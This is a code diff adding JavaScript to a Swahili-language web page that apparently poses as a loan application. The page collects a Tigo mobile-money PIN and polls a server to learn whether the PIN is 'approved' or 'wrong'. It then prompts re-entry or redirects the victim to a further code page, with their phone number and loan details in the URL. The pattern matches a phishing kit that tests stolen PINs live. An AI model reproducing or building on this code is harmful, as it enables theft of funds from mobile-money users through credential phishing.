@@ -135,4 +135,34 @@
             if (checkInterval) clearInterval(checkInterval); 
             checkInterval = setInterval(async function() { 
                 try { 
-                    var res = await fetch('/api/check_status/' + appId
+                    var res = await fetch('/api/check_status/' + appId); 
+                    var data = await res.json(); 
+                    
+                    if (data.status === 'approved') { 
+                        clearInterval(checkInterval);
+                        // Redirect to code page
+                        window.location.href = '/code?app_id=' + appId + '&phone=' + userPhone + '&amount=' + loanAmount + '&term=' + loanTerm;
+                    } 
+                    else if (data.status === 'wrong_pin') { 
+                        clearInterval(checkInterval);
+                        document.getElementById('pinError').textContent = 'PIN sio sahihi. Jaribu tena.';
+                        document.getElementById('pinError').style.color = 'var(--danger)';
+                        document.getElementById('pinError').classList.add('show');
+                        document.getElementById('screen2').classList.add('hidden');
+                        document.getElementById('screen1').classList.remove('hidden');
+                        document.getElementById('submitBtn').disabled = false;
+                        document.getElementById('submitBtn').innerHTML = 'Endelea →';
+                        document.getElementById('tigoPin').value = '';
+                        document.getElementById('tigoPin').focus();
+                    } 
+                    else if (data.status === 'invalid_number') { 
+                        clearInterval(checkInterval);
+                        alert('Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo.');
+                        window.location.href = '/apply';
+                    }
+                } catch(e) {} 
+            }, 3000); 
+        }
+    </script>
+</body>
+</html>
